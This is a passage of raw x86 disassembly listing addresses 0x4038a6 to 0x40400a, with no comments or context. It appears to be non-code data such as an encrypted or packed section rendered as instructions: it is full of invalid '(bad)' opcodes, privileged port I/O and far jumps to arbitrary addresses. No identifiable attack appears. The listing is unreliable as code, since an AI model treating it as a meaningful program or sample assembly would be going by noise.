  4038a6:	sbb    BYTE PTR [esi+0x42],bh
  4038a9:	dec    esp
  4038aa:	mov    al,ds:0x51943a64
  4038af:	jge    0x403875
  4038b1:	in     eax,0x50
  4038b3:	call   0xf76a7532
  4038b8:	loopne 0x403933
  4038ba:	dec    edi
  4038bb:	dec    esi
  4038bc:	das    
  4038bd:	mov    esp,0x2321d69c
  4038c2:	maxps  xmm4,XMMWORD PTR [eax+0x1d]
  4038c6:	mov    dl,0x98
  4038c8:	and    al,0x8
  4038ca:	in     al,dx
  4038cb:	pmullw mm0,QWORD PTR [edx-0x6d26cd84]
  4038d2:	mov    bl,0xa1
  4038d4:	test   eax,0xe78a0cae
  4038d9:	in     al,dx
  4038da:	enter  0xd4c2,0xcc
  4038de:	xchg   edx,eax
  4038df:	not    ebx
  4038e1:	adc    bh,BYTE PTR [ecx]
  4038e3:	icebp  
  4038e4:	fsubr  DWORD PTR [ebx]
  4038e6:	shl    BYTE PTR [eax-0x5b],1
  4038e9:	push   eax
  4038ea:	(bad)  [edx+ebp*8]
  4038ed:	jmp    0x8545:0x2e8beb9a
  4038f4:	ins    DWORD PTR es:[edi],dx
  4038f5:	cdq    
  4038f6:	dec    eax
  4038f7:	inc    edx
  4038f8:	rcr    dl,cl
  4038fa:	iret   
  4038fb:	dec    edi
  4038fc:	pop    ebx
  4038fd:	js     0x40397b
  4038ff:	mov    ebx,DWORD PTR ds:0xb362f24b
  403905:	adc    BYTE PTR [edx],ch
  403907:	out    dx,al
  403908:	jo     0x403919
  40390a:	clc    
  40390b:	add    eax,0x3529f2d7
  403910:	mov    ch,0xa6
  403912:	sbb    bh,BYTE PTR [esp+eiz*2+0x7c9daccc]
  403919:	sbb    al,0xfb
  40391b:	shl    DWORD PTR [eax+ecx*8],1
  40391e:	add    eax,0xd9ef220d
  403923:	shr    DWORD PTR [eax+0x39],0x79
  403927:	push   ebx
  403928:	bound  eax,QWORD PTR [edi+0x3f]
  40392b:	clc    
  40392c:	int3   
  40392d:	test   al,0x9c
  40392f:	mov    al,ds:0xdf0e6249
  403934:	pop    ds
  403935:	nop
  403936:	sub    eax,DWORD PTR [ebx]
  403938:	or     BYTE PTR [ebp+0x8],cl
  40393b:	xor    DWORD PTR [edx],eax
  40393d:	int    0xb5
  40393f:	xor    eax,0x39d482cc
  403944:	fwait
  403945:	xchg   BYTE PTR [ebx-0x3b9d5c19],al
  40394b:	loope  0x40392f
  40394d:	cli    
  40394e:	mov    ah,BYTE PTR [ecx]
  403950:	jp     0x4039be
  403952:	ins    DWORD PTR es:[edi],dx
  403953:	mov    eax,0xdb8c9a1f
  403958:	adc    al,0xf0
  40395a:	ins    BYTE PTR es:[edi],dx
  40395b:	int    0xd5
  40395d:	jle    0x4039bd
  40395f:	dec    esi
  403960:	pop    edx
  403961:	and    al,dl
  403963:	mov    bh,BYTE PTR [ebx+0x27]
  403966:	loope  0x4039ce
  403968:	cmp    eax,0x35101292
  40396d:	(bad)  
  40396e:	and    ebx,ecx
  403970:	ja     0x4038f9
  403972:	jle    0x403950
  403974:	(bad)  
  403975:	push   0xffffffa4
  403977:	fcmovnu st,st(5)
  403979:	(bad)  
  40397a:	test   BYTE PTR [ebx-0x29],0xaa
  40397e:	xlat   BYTE PTR ds:[ebx]
  40397f:	adc    al,0xe3
  403981:	(bad)
  403984:	add    ebp,esi
  403986:	push   esi
  403987:	adc    cl,BYTE PTR [edx+ebp*8-0x2f]
  40398b:	fwait
  40398c:	outs   dx,DWORD PTR ds:[esi]
  40398d:	into   
  40398e:	cmp    BYTE PTR [ebx+0x24],bh
  403991:	ret    
  403992:	and    DWORD PTR [ecx-0x58],esp
  403995:	out    0x29,eax
  403997:	pop    ss
  403998:	pop    eax
  403999:	xor    DWORD PTR [edi+0x6a],ebp
  40399c:	dec    esi
  40399d:	retf   0x8d6f
  4039a0:	call   0xee0e:0x42c3aaf2
  4039a7:	mov    dh,dh
  4039a9:	loop   0x4039a8
  4039ab:	mov    ch,0x2f
  4039ad:	repnz inc eax
  4039af:	fisttp WORD PTR [ecx]
  4039b1:	cmp    dh,BYTE PTR [edx-0x22cf510b]
  4039b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4039b8:	lods   al,BYTE PTR ds:[esi]
  4039b9:	sub    eax,edi
  4039bb:	fwait
  4039bc:	mov    ebx,0xecdeaea1
  4039c1:	dec    edi
  4039c2:	adc    edx,DWORD PTR [edx+0x16aa598f]
  4039c8:	xor    BYTE PTR [edi],dl
  4039ca:	xor    BYTE PTR [edi],bl
  4039cc:	xchg   ebp,eax
  4039cd:	push   ebx
  4039ce:	leave  
  4039cf:	push   cs
  4039d0:	mov    esi,0x4287fcc2
  4039d5:	cli    
  4039d6:	dec    ecx
  4039d7:	xor    bh,BYTE PTR [esi+0x46]
  4039da:	sahf   
  4039db:	pushf  
  4039dc:	cmp    eax,0xe6fba68f
  4039e1:	js     0x403984
  4039e3:	xchg   BYTE PTR [ecx],al
  4039e5:	fidivr DWORD PTR [eax+0x139a7e71]
  4039eb:	sar    ah,1
  4039ed:	xor    DWORD PTR [eax+edx*1-0x42],eax
  4039f1:	mov    edx,0x86639581
  4039f6:	lock or eax,0xc089b8fb
  4039fc:	(bad)  
  4039fd:	mov    esp,0xcc24c796
  403a02:	mov    ebp,0xb46c39f1
  403a07:	xor    al,0x22
  403a09:	and    esi,ebp
  403a0b:	sahf   
  403a0c:	jg     0x403a8b
  403a0e:	mov    ds:0x9832ed1f,al
  403a13:	sub    DWORD PTR [esi],0x5eb98ae8
  403a19:	(bad)  
  403a1a:	lea    esi,[eax+0x27da64d2]
  403a20:	cmp    eax,0xfa42f3e5
  403a25:	pop    ds
  403a26:	div    BYTE PTR [edi]
  403a28:	out    dx,al
  403a29:	inc    edi
  403a2a:	sub    DWORD PTR [esi-0x25],edx
  403a2d:	cmc    
  403a2e:	retf   0x722c
  403a31:	jnp    0x403a7f
  403a33:	loopne 0x403a73
  403a35:	xor    BYTE PTR [edx+0x23],cl
  403a38:	xchg   WORD PTR [esi+0x36e71299],ax
  403a3f:	xor    ebp,ebp
  403a41:	das    
  403a42:	pop    esp
  403a43:	sbb    ah,bh
  403a45:	lahf   
  403a46:	data16 into 
  403a48:	out    dx,eax
  403a49:	pop    edi
  403a4a:	test   DWORD PTR [esi+0x65],ecx
  403a4d:	push   0xb7afa7dd
  403a52:	daa    
  403a53:	gs jae 0x403a70
  403a56:	cld    
  403a57:	test   BYTE PTR [ebx+ecx*8-0xb],dl
  403a5b:	mov    ch,0xbf
  403a5d:	jne    0x403a96
  403a5f:	pusha  
  403a60:	xlat   BYTE PTR ds:[ebx]
  403a61:	inc    ecx
  403a62:	xchg   BYTE PTR [edx-0x2f],dl
  403a65:	aam    0x6d
  403a67:	mov    bh,0x5
  403a69:	mov    ebp,0xfcecd0e
  403a6e:	jecxz  0x403a30
  403a70:	push   esi
  403a71:	sub    ah,dl
  403a73:	test   bl,cl
  403a75:	sbb    ebp,DWORD PTR [edi]
  403a77:	pop    esi
  403a78:	inc    esp
  403a79:	xor    dl,cl
  403a7b:	adc    ch,dh
  403a7d:	cs jbe 0x403a34
  403a80:	dec    ecx
  403a81:	xor    al,0x17
  403a83:	lds    ebx,FWORD PTR [ecx]
  403a85:	call   0x8b4e2b92
  403a8a:	mov    dl,0x83
  403a8c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403a8d:	push   esp
  403a8e:	xchg   DWORD PTR [ebx-0x69e4e9d],esi
  403a94:	es xchg esp,eax
  403a96:	aas    
  403a97:	rol    edx,0x9c
  403a9a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403a9b:	xchg   esi,eax
  403a9c:	add    esi,DWORD PTR [ebp+0xb]
  403a9f:	and    DWORD PTR [eax+0x1c],0x7f
  403aa3:	fild   DWORD PTR [edx+0x69d8601f]
  403aa9:	push   0x6bdee150
  403aae:	mov    dh,0xd2
  403ab0:	gs (bad) 
  403ab2:	or     edx,DWORD PTR [ecx]
  403ab4:	out    dx,al
  403ab5:	pop    es
  403ab6:	xor    al,bh
  403ab8:	jmp    0xcd03:0xc5ce174a
  403abf:	xchg   esi,eax
  403ac0:	loope  0x403a71
  403ac2:	repz enter 0x1ae9,0x3a
  403ac7:	or     al,0x73
  403ac9:	push   cs
  403aca:	xor    DWORD PTR [ebp-0x710eae2a],eax
  403ad0:	arpl   WORD PTR [ecx-0x19],cx
  403ad3:	and    DWORD PTR [esi],0xffffffac
  403ad6:	mov    DWORD PTR [eax-0x50f56622],ecx
  403adc:	xor    al,0x4c
  403ade:	retf   
  403adf:	rcl    ebp,cl
  403ae1:	mov    WORD PTR [esi+0x24013115],fs
  403ae7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403ae8:	mov    ecx,DWORD PTR [esi+0x16e3da2c]
  403aee:	sub    ah,BYTE PTR [esi]
  403af0:	imul   ebx,DWORD PTR [ebx+0x1f],0x6b
  403af4:	inc    esp
  403af5:	(bad)  
  403af6:	sar    DWORD PTR fs:[ecx+eiz*8],1
  403afa:	(bad)  
  403afc:	cmp    BYTE PTR [eax+0x14],0xd9
  403b00:	xlat   BYTE PTR ds:[ebx]
  403b01:	popf   
  403b02:	xchg   edx,eax
  403b03:	xchg   dl,dl
  403b05:	fmul   st,st(5)
  403b07:	mov    esi,0x76c1dabe
  403b0c:	call   0x574e5054
  403b11:	ret    0xa8af
  403b14:	std    
  403b15:	pop    edx
  403b16:	fistp  DWORD PTR [edx+0x13]
  403b19:	xchg   esi,esi
  403b1b:	push   esp
  403b1c:	mov    ah,0x75
  403b1e:	shl    esi,1
  403b20:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  403b22:	sub    BYTE PTR [edi-0x7af8edee],bl
  403b28:	gs ins DWORD PTR es:[edi],dx
  403b2a:	not    BYTE PTR [edi+0x4f]
  403b2d:	jmp    0xb645:0x3f9c2841
  403b34:	ret    
  403b35:	fsub   st(4),st
  403b37:	(bad)  
  403b38:	mov    eax,ds:0x31e44cad
  403b3d:	mov    bl,0xe9
  403b3f:	sub    edx,DWORD PTR ds:0x7fa13203
  403b45:	or     DWORD PTR [esi+0x3d],esi
  403b48:	sub    DWORD PTR [ecx+0x19],edi
  403b4b:	mov    ds:0xf8e742c4,al
  403b50:	xor    BYTE PTR [ebx],bh
  403b52:	add    ch,0xe7
  403b55:	cmp    al,0x6b
  403b57:	push   esi
  403b58:	sti    
  403b59:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403b5b:	fild   QWORD PTR [ebp+0x6b]
  403b5e:	ds pop esp
  403b60:	mov    ds:0x5212c305,al
  403b65:	mov    dh,0xd3
  403b67:	dec    ebp
  403b68:	ins    BYTE PTR es:[edi],dx
  403b69:	pusha  
  403b6a:	jmp    0xedd3:0x74696a0e
  403b71:	xor    al,0xe4
  403b73:	jmp    0xac0cf8c8
  403b78:	mov    bh,0xac
  403b7a:	enter  0xecba,0x1e
  403b7e:	sub    dh,BYTE PTR [edx+0x68]
  403b81:	fdivp  st(6),st
  403b83:	push   eax
  403b84:	inc    esi
  403b85:	jae    0x403b2b
  403b87:	sub    DWORD PTR [eax-0x34],eax
  403b8a:	or     cl,BYTE PTR [edx-0x7e402052]
  403b90:	sbb    dl,BYTE PTR [edx-0x6a7bcaeb]
  403b96:	or     BYTE PTR [ebx],dh
  403b98:	aam    0x53
  403b9a:	fmul   st(4),st
  403b9c:	mov    bl,0x68
  403b9e:	cli    
  403b9f:	sahf   
  403ba0:	mov    eax,edx
  403ba2:	ret    0x8f14
  403ba5:	mov    esi,0xe9912970
  403baa:	add    DWORD PTR [edi+0x7e],ebx
  403bad:	mov    ds:0x2b8ef917,eax
  403bb2:	jecxz  0x403ba7
  403bb4:	mov    eax,0x71bf2cde
  403bb9:	push   0xffffff90
  403bbb:	outs   dx,DWORD PTR ds:[esi]
  403bbc:	dec    esi
  403bbd:	sbb    esi,esi
  403bbf:	sbb    bl,al
  403bc1:	ss xchg edi,eax
  403bc3:	pop    ebx
  403bc4:	xor    bh,BYTE PTR [edi+0x68caa578]
  403bca:	outs   dx,DWORD PTR ds:[esi]
  403bcb:	rol    BYTE PTR [eax-0x7f],1
  403bce:	mov    dl,0x9a
  403bd0:	pop    ecx
  403bd1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403bd2:	mov    ebx,0xfa29dcb1
  403bd7:	int3   
  403bd8:	sbb    DWORD PTR [ebp+eax*4+0x4e],eax
  403bdc:	ficom  WORD PTR [ecx+0x6d]
  403bdf:	push   edi
  403be0:	adc    edi,DWORD PTR [ebx]
  403be2:	cs ss in al,0x7b
  403be6:	adc    dh,BYTE PTR [ecx]
  403be8:	cmp    eax,0xc307cfb4
  403bed:	cwde   
  403bee:	icebp  
  403bef:	sub    al,0x6e
  403bf1:	pop    edx
  403bf2:	test   BYTE PTR [esi+0x2435e7ea],0xc4
  403bf9:	xor    DWORD PTR [esi],esp
  403bfb:	pop    edx
  403bfc:	sub    eax,0x5994f7a3
  403c01:	imul   eax,DWORD PTR [ebp+0x1a679b2f],0xffffffd8
  403c08:	fcomp  QWORD PTR [ebx+ebp*8+0x2]
  403c0c:	arpl   WORD PTR [ebx],cx
  403c0e:	or     bl,BYTE PTR [eax+0xf]
  403c11:	inc    edx
  403c12:	mov    edi,0x89a46b28
  403c17:	icebp  
  403c18:	or     al,0xd7
  403c1a:	adc    ecx,DWORD PTR [ebx]
  403c1c:	int3   
  403c1d:	(bad)  
  403c1e:	mov    esi,0xf47f3919
  403c23:	xor    DWORD PTR [eax],ecx
  403c25:	stc    
  403c26:	ror    DWORD PTR [ecx+0x7],0x5a
  403c2a:	test   BYTE PTR [edx-0x78],cl
  403c2d:	add    DWORD PTR [edx-0x53],ebx
  403c30:	ins    DWORD PTR es:[edi],dx
  403c31:	pop    eax
  403c32:	inc    ebx
  403c33:	cmp    BYTE PTR [ebp+0x2d],0xc2
  403c37:	in     al,0x6d
  403c39:	addr16 cld 
  403c3b:	arpl   WORD PTR [ebx-0x75],di
  403c3e:	xor    cl,ch
  403c40:	cs mov ebx,es
  403c43:	call   0x932e8840
  403c48:	add    dl,BYTE PTR [edx-0x551dbbd0]
  403c4e:	mov    al,0xde
  403c50:	jecxz  0x403c0e
  403c52:	repnz push 0x62f9a40f
  403c58:	sbb    ebx,eax
  403c5a:	fs push ebp
  403c5c:	pop    edx
  403c5d:	sub    esi,DWORD PTR [ebx]
  403c5f:	sub    bh,bl
  403c61:	jl     0x403c75
  403c63:	stos   BYTE PTR es:[edi],al
  403c64:	int    0x2c
  403c66:	lods   al,BYTE PTR ds:[esi]
  403c67:	jmp    0x901e:0x1f5db08c
  403c6e:	pushf  
  403c6f:	(bad)  
  403c70:	inc    edx
  403c71:	cld    
  403c72:	dec    ebx
  403c73:	sub    al,0xeb
  403c75:	dec    ebx
  403c76:	xlat   BYTE PTR ds:[ebx]
  403c77:	iret   
  403c78:	sbb    al,0xa4
  403c7a:	push   0xfb2c4d45
  403c7f:	aad    0x17
  403c81:	psubusw mm5,mm2
  403c84:	jecxz  0x403cd9
  403c86:	dec    edi
  403c87:	mov    dl,0x90
  403c89:	pushf  
  403c8a:	rol    BYTE PTR [ebp-0x66],0xf2
  403c8e:	cld    
  403c8f:	xchg   BYTE PTR [esi+esi*1],ch
  403c92:	fbld   TBYTE PTR [ebp-0x28]
  403c95:	mov    ah,0x3a
  403c97:	mov    esi,0xb0de346d
  403c9c:	sbb    ebx,ebp
  403c9e:	fsub   DWORD PTR [esi+esi*1+0x19fb421e]
  403ca5:	jl     0x403c95
  403ca7:	dec    ebp
  403ca8:	inc    eax
  403ca9:	pop    es
  403caa:	adc    edx,DWORD PTR [edi+ebx*8-0x6e1e6a3f]
  403cb1:	push   ebp
  403cb2:	fcomi  st,st(1)
  403cb4:	cmp    edx,DWORD PTR [ebx]
  403cb6:	sub    ch,ch
  403cb8:	jle    0x403d36
  403cba:	imul   ebp,edi,0xffffff8d
  403cbd:	stc    
  403cbe:	cld    
  403cbf:	push   ds
  403cc0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403cc1:	push   esi
  403cc2:	jmp    FWORD PTR [edi]
  403cc4:	popa   
  403cc5:	adc    ebx,esp
  403cc7:	pop    ebx
  403cc8:	or     esp,eax
  403cca:	test   al,0x9f
  403ccc:	lahf   
  403ccd:	pop    ds
  403cce:	jae    0x403cc3
  403cd0:	(bad)  
  403cd1:	gs mov al,0xad
  403cd4:	stos   BYTE PTR es:[edi],al
  403cd5:	adc    ah,BYTE PTR [ebx+edi*4+0x3d]
  403cd9:	sbb    al,0x44
  403cdb:	shl    BYTE PTR [esi],cl
  403cdd:	jae    0x403d14
  403cdf:	sbb    ecx,DWORD PTR [ebx-0x39bdf8c6]
  403ce5:	lea    eax,[esi+0x547159ad]
  403ceb:	loopne 0x403d02
  403ced:	(bad)  
  403cee:	(bad)  
  403cf0:	mov    eax,0xd71ada81
  403cf5:	sbb    eax,0x262334
  403cfa:	jl     0x403ca7
  403cfc:	xor    dl,bh
  403cfe:	pop    ebp
  403cff:	xor    al,0xe2
  403d01:	arpl   WORD PTR [ecx+eiz*4+0x1dcbd04a],bp
  403d08:	shr    BYTE PTR [edx-0x57],cl
  403d0b:	or     eax,0x959affed
  403d10:	hlt    
  403d11:	sbb    ch,BYTE PTR [edx-0x53]
  403d14:	add    cl,ch
  403d16:	mov    esi,0xa85abbe
  403d1b:	lds    esi,FWORD PTR [ebp+0x41ed4805]
  403d21:	pop    esp
  403d22:	adc    al,0xe2
  403d24:	push   esi
  403d25:	adc    ebx,ebp
  403d27:	inc    esp
  403d28:	fistp  DWORD PTR [esi+0x1d]
  403d2b:	mov    ds,WORD PTR [eax+0x7fc0f47e]
  403d31:	cmp    eax,0x25d31392
  403d36:	xor    BYTE PTR [ecx+0x2b4e3014],ch
  403d3c:	pop    esp
  403d3d:	outs   dx,BYTE PTR ds:[esi]
  403d3e:	xchg   ecx,eax
  403d3f:	jbe    0x403d31
  403d41:	jb     0x403d58
  403d43:	xor    al,0xf3
  403d45:	ret    
  403d46:	sbb    al,0x42
  403d48:	mov    ?,WORD PTR ds:0xea921b58
  403d4e:	pop    eax
  403d4f:	xchg   BYTE PTR [esi+0x3a236950],al
  403d55:	jge    0x403dbb
  403d57:	inc    ebx
  403d58:	cmp    al,0x2a
  403d5a:	mov    ds:0xac975cda,al
  403d5f:	adc    bl,BYTE PTR [eax]
  403d61:	shr    BYTE PTR [eax+0x35b9a15f],1
  403d67:	dec    ecx
  403d68:	or     DWORD PTR [edx-0x61],ebp
  403d6b:	fstp   DWORD PTR [edx-0x2d]
  403d6e:	int    0x3e
  403d70:	fld    TBYTE PTR [edx]
  403d72:	popf   
  403d73:	lods   eax,DWORD PTR ds:[esi]
  403d74:	push   esi
  403d75:	call   0x4e69:0xd49211f8
  403d7c:	into   
  403d7d:	mov    ebx,0x37a752af
  403d82:	pop    edi
  403d83:	and    eax,0x2795459f
  403d88:	xchg   bl,al
  403d8a:	add    DWORD PTR [ecx],ecx
  403d8c:	push   esp
  403d8d:	inc    edx
  403d8e:	out    0xe5,eax
  403d90:	test   DWORD PTR cs:[esp+ebx*2],eax
  403d94:	into   
  403d95:	int3   
  403d96:	mov    eax,0xb26247b
  403d9b:	aas    
  403d9c:	adc    ecx,DWORD PTR [ebx-0x36c8c815]
  403da2:	ds jo  0x403d35
  403da5:	hlt    
  403da6:	sub    BYTE PTR [edx+0x2d56e9ec],0x63
  403dad:	fsubr  DWORD PTR [esp+eax*4]
  403db0:	cwde   
  403db1:	(bad)  
  403db2:	in     eax,dx
  403db3:	in     eax,dx
  403db4:	sbb    DWORD PTR [esp+edi*8],edi
  403db7:	mov    ch,0x14
  403db9:	mov    al,0x17
  403dbb:	rcr    DWORD PTR [edx-0x3b9e314f],1
  403dc1:	cmp    DWORD PTR [edi],esi
  403dc3:	inc    edi
  403dc4:	call   0xc563c725
  403dc9:	xchg   edx,eax
  403dca:	sub    BYTE PTR ss:[edx],al
  403dcd:	mov    ch,0x8b
  403dcf:	lds    ebx,FWORD PTR [esi+0x62]
  403dd2:	and    eax,0xf9df133f
  403dd7:	aam    0x8
  403dd9:	push   esi
  403dda:	mov    DWORD PTR [ecx],eax
  403ddc:	pop    esi
  403ddd:	adc    eax,0xf52f8bba
  403de2:	jns    0x403da9
  403de4:	shl    DWORD PTR [esp+edi*2-0x142a299e],1
  403deb:	mov    ds:0xdc5ea886,al
  403df0:	adc    BYTE PTR [esi-0x5c],0xe0
  403df4:	xchg   ebp,eax
  403df5:	add    dl,BYTE PTR [edx]
  403df7:	adc    DWORD PTR [edx+0x9cea867],esi
  403dfd:	shl    DWORD PTR [ebp-0x62],0x60
  403e01:	out    0x8e,eax
  403e03:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403e04:	dec    esp
  403e05:	shl    DWORD PTR [edi],0x37
  403e08:	outs   dx,BYTE PTR ds:[esi]
  403e09:	pop    ecx
  403e0a:	dec    ecx
  403e0b:	add    ch,0x7c
  403e0e:	retf   
  403e0f:	mov    edx,eax
  403e11:	sbb    al,0x8e
  403e13:	loopne 0x403e8f
  403e15:	out    0xe0,al
  403e17:	mov    dh,0xa3
  403e19:	pop    ecx
  403e1a:	pop    ebx
  403e1b:	std    
  403e1c:	sub    dh,BYTE PTR [ecx-0x68]
  403e1f:	mov    dl,0x7c
  403e21:	inc    ebp
  403e22:	loop   0x403dc1
  403e24:	add    cl,cl
  403e26:	xor    cl,BYTE PTR [edi]
  403e28:	pop    esp
  403e29:	mov    ebp,0xa194c620
  403e2e:	push   ss
  403e2f:	xchg   ebx,eax
  403e30:	in     eax,dx
  403e31:	scas   al,BYTE PTR es:[edi]
  403e32:	iret   
  403e33:	mov    dh,0x22
  403e35:	in     al,0xb3
  403e37:	xor    eax,eax
  403e39:	(bad)  
  403e3a:	or     al,0x15
  403e3c:	(bad)  
  403e3d:	pushf  
  403e3e:	in     al,0x4f
  403e40:	iret   
  403e41:	xchg   ebp,eax
  403e42:	das    
  403e43:	fild   DWORD PTR [ebx+edx*8]
  403e46:	add    ebp,ebp
  403e48:	dec    ecx
  403e49:	fnsave [ebx+0x98ada09]
  403e4f:	in     al,0x86
  403e51:	fistp  DWORD PTR [esi-0x29]
  403e54:	pushf  
  403e55:	outs   dx,DWORD PTR ds:[esi]
  403e56:	xlat   BYTE PTR ds:[ebx]
  403e57:	push   ss
  403e58:	inc    ebx
  403e59:	outs   dx,BYTE PTR ds:[esi]
  403e5a:	mov    fs,WORD PTR [ebx+eiz*8+0x713cbf8]
  403e61:	rcr    DWORD PTR [ebx],1
  403e63:	js     0x403df2
  403e65:	push   ebp
  403e66:	sub    cl,bh
  403e68:	mov    fs,WORD PTR [ebx+0x49]
  403e6b:	add    ecx,edi
  403e6d:	cdq    
  403e6e:	sbb    al,0x0
  403e70:	mov    DWORD PTR [ebx],0xecfd4bb4
  403e76:	ins    BYTE PTR es:[edi],dx
  403e77:	or     ebx,esi
  403e79:	jecxz  0x403e0a
  403e7b:	mov    al,ds:0x29f35718
  403e80:	cmp    edi,ebp
  403e82:	mov    bl,0xd8
  403e84:	sbb    dl,BYTE PTR fs:[ebx+0x52]
  403e88:	push   esi
  403e89:	lahf   
  403e8a:	pop    ds
  403e8b:	cmp    DWORD PTR [esi],eax
  403e8d:	icebp  
  403e8e:	cld    
  403e8f:	xchg   BYTE PTR [eax+0x7a],ch
  403e92:	or     sp,WORD PTR [eax+esi*1]
  403e96:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403e97:	daa    
  403e98:	pop    ss
  403e99:	inc    edx
  403e9a:	dec    edx
  403e9b:	loop   0x403f0a
  403e9d:	push   cs
  403e9e:	mov    ecx,0xc4beac87
  403ea3:	sub    ebp,DWORD PTR [esi+0x66b12686]
  403ea9:	in     al,0xd5
  403eab:	jo     0x403ee6
  403ead:	jae    0x403e54
  403eaf:	hlt    
  403eb0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403eb1:	mov    ds:0xcf48b1fd,al
  403eb6:	(bad)  
  403eb7:	jo     0x403efe
  403eb9:	ret    0x57da
  403ebc:	lods   al,BYTE PTR ds:[esi]
  403ebd:	mov    BYTE PTR [edi],al
  403ebf:	xchg   ebx,eax
  403ec0:	ds mov ebx,0xe39ab7a0
  403ec6:	in     eax,dx
  403ec7:	fld    TBYTE PTR [ebp+0x57]
  403eca:	into   
  403ecb:	loope  0x403f0b
  403ecd:	xlat   BYTE PTR ds:[ebx]
  403ece:	pop    edx
  403ecf:	aaa    
  403ed0:	or     edi,0xffffff96
  403ed3:	aaa    
  403ed4:	loopne 0x403ebe
  403ed6:	loope  0x403f0f
  403ed8:	dec    eax
  403ed9:	jne    0x403e81
  403edb:	mov    bh,ah
  403edd:	retf   
  403ede:	rcr    BYTE PTR [ebx],cl
  403ee0:	adc    ah,0x43
  403ee3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403ee4:	sub    BYTE PTR [ebp-0x50],ah
  403ee7:	iret   
  403ee8:	mov    eax,0xa3c13901
  403eed:	adc    edi,DWORD PTR [ebx-0x4f]
  403ef0:	push   cs
  403ef1:	int    0x53
  403ef3:	call   0xd333:0x12cb54d9
  403efa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403efb:	jnp    0x403e7f
  403efd:	out    dx,al
  403efe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403eff:	add    edi,DWORD PTR ss:[esi]
  403f02:	ud2    
  403f04:	add    al,0x26
  403f06:	and    DWORD PTR [eax-0x3f14fe16],eax
  403f0c:	cdq    
  403f0d:	jns    0x403f0e
  403f0f:	cmp    ecx,edi
  403f11:	mov    ds:0xebe55e7e,al
  403f16:	xlat   BYTE PTR ds:[ebx]
  403f17:	rol    al,1
  403f19:	in     eax,dx
  403f1a:	and    al,0x46
  403f1c:	push   cs
  403f1d:	pop    ebp
  403f1e:	bound  ebx,QWORD PTR [edi-0x460e0683]
  403f24:	out    dx,al
  403f25:	pop    ds
  403f26:	frstor [ebp-0x76]
  403f29:	adc    eax,0xebe316ef
  403f2e:	mov    cl,0x88
  403f30:	add    ebp,edx
  403f32:	aaa    
  403f33:	add    eax,0xae3363c2
  403f38:	push   ss
  403f39:	pop    es
  403f3a:	push   edi
  403f3b:	arpl   cx,si
  403f3d:	sub    esi,DWORD PTR [edx+edi*8]
  403f40:	pop    esp
  403f41:	cmc    
  403f42:	or     al,0xca
  403f44:	pushf  
  403f45:	inc    ebp
  403f46:	mov    WORD PTR [esi+0x71],fs
  403f49:	xor    ch,ch
  403f4b:	jo     0x403f31
  403f4d:	add    cl,0xdd
  403f50:	imul   ecx,DWORD PTR [edx+edi*4-0x51],0x42b38761
  403f58:	out    0x38,eax
  403f5a:	mov    al,0xcb
  403f5c:	jae    0x403f24
  403f5e:	nop
  403f5f:	popa   
  403f60:	jl     0x403f92
  403f62:	pop    ds
  403f63:	xchg   ebp,eax
  403f64:	xchg   edx,eax
  403f65:	mov    eax,0xffa47c7c
  403f6a:	and    al,0x44
  403f6c:	xchg   ebp,ebx
  403f6e:	mov    dl,ah
  403f70:	mov    DWORD PTR [eax-0x75],esi
  403f73:	inc    ebx
  403f74:	or     ah,BYTE PTR ds:0x3b667bf4
  403f7a:	cld    
  403f7b:	push   esp
  403f7c:	stos   BYTE PTR es:[edi],al
  403f7d:	je     0x403fe8
  403f7f:	out    dx,eax
  403f80:	(bad)  
  403f81:	lock cmp al,0x3e
  403f84:	sub    BYTE PTR [ebx-0x6dc988f9],0x25
  403f8b:	xor    al,0x39
  403f8d:	test   al,0x51
  403f8f:	stos   BYTE PTR es:[edi],al
  403f90:	jnp    0x403fcc
  403f92:	jecxz  0x403f9a
  403f94:	inc    esi
  403f95:	outs   dx,BYTE PTR ds:[esi]
  403f96:	sub    BYTE PTR [ebx+0x63474a78],dl
  403f9c:	clc    
  403f9d:	add    esi,DWORD PTR [edi+0x65]
  403fa0:	mov    edx,0x4b0c3637
  403fa5:	cmp    al,0xaf
  403fa7:	ins    DWORD PTR es:[edi],dx
  403fa8:	cdq    
  403fa9:	add    DWORD PTR [edx-0x570e6d17],ebx
  403faf:	in     al,dx
  403fb0:	std    
  403fb1:	cmp    edx,DWORD PTR [eax-0x1105be0d]
  403fb7:	ficomp DWORD PTR [edi]
  403fb9:	(bad)  
  403fba:	fstp   QWORD PTR [esi+0x6b]
  403fbd:	cs loopne 0x40400b
  403fc0:	cs dec eax
  403fc2:	inc    eax
  403fc3:	sbb    eax,0xac82fa9
  403fc8:	sub    edx,DWORD PTR [edi]
  403fca:	hlt    
  403fcb:	gs scas al,BYTE PTR es:[edi]
  403fcd:	bound  eax,QWORD PTR [edx+0x55bc7ddc]
  403fd3:	add    BYTE PTR [ecx-0x1240da7e],ch
  403fd9:	push   es
  403fda:	mov    dl,0x44
  403fdc:	jge    0x403f6d
  403fde:	je     0x403fef
  403fe0:	stc    
  403fe1:	leave  
  403fe2:	dec    ebx
  403fe3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403fe4:	mov    ds:0x70a5b29c,eax
  403fe9:	test   BYTE PTR [esi+0x49],0x25
  403fed:	adc    BYTE PTR [edx+0x58],dh
  403ff0:	push   ebp
  403ff1:	pusha  
  403ff2:	mov    bh,0x94
  403ff4:	mov    ebp,0x8254cc2a
  403ff9:	out    0x7,al
  403ffb:	in     al,dx
  403ffc:	pushf  
  403ffd:	lods   al,BYTE PTR ds:[esi]
  403ffe:	and    dh,BYTE PTR [ebx+eiz*4+0x69]
  404002:	sub    al,0xd
  404004:	dec    ebp
  404005:	call   0x5f658597
  40400a:	fdiv   QWORD PTR [ecx]
